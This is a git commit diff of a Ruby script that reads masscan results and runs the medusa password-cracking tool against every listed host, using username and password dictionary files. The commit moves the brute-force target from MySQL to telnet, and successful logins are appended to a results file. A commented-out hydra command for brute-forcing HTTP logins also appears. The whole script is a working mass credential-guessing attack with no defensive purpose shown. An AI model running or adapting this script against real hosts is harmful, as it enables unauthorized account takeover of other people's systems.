710bc770aeb0cafeff6d65f7188e0307e2b86b07
root <root@localhost.localdomain>
2015-07-07 01:12:46 +0800

    medusa

--- bin/medusa_ssh.rb
+++ bin/medusa_ssh.rb
@@ -1,23 +1,23 @@
 #!/usr/bin/env ruby
 
 #medusa -M http -h 10.99.184.116 -n 8888 -U ../../develop/masport/db/dict/user.txt -P ../../develop/masport/db/dict/pass.txt
-#hydra -t 64 -V -L ../db/dict/user.txt -P ../db/dict/pass.txt -M ../db/hydra/url.txt http-get
-input = '../db/masscan/ips.1435007435'
+input = '../db/masscan/ips.1433776043'
 
 File.open(input).each do |line|
-  next if !line.include?('3306')
-  result = ''
   line.chomp!
+  next if !line.end_with?('23')
+  service = 'telnet'
+  result = ''
   ary = line.split ':'
   ip   = ary[0]
   port = ary[1]
   if ip and port
     #puts line
-    cmd="medusa -e ns -t 64 -w 1 -v 4 -M mysql -h #{ip} -n #{port} -U ../db/dict/user.txt -P ../db/dict/pass.txt"
+    cmd="medusa -e ns -t 64 -w 1 -v 4 -M #{service} -h #{ip} -n #{port} -U ../db/dict/user.txt -P ../db/dict/pass.txt"
     puts 'Running syscmd: '+cmd
     result = `#{cmd}`
     if result and result.include? '[SUCCESS]'
-      File.open('../db/medusa/mysql_result.txt', 'a') { |file| 
+      File.open('../db/medusa/telnet_result.txt', 'a') { |file| 
         file.write(cmd)
         file.write(result) 
       }
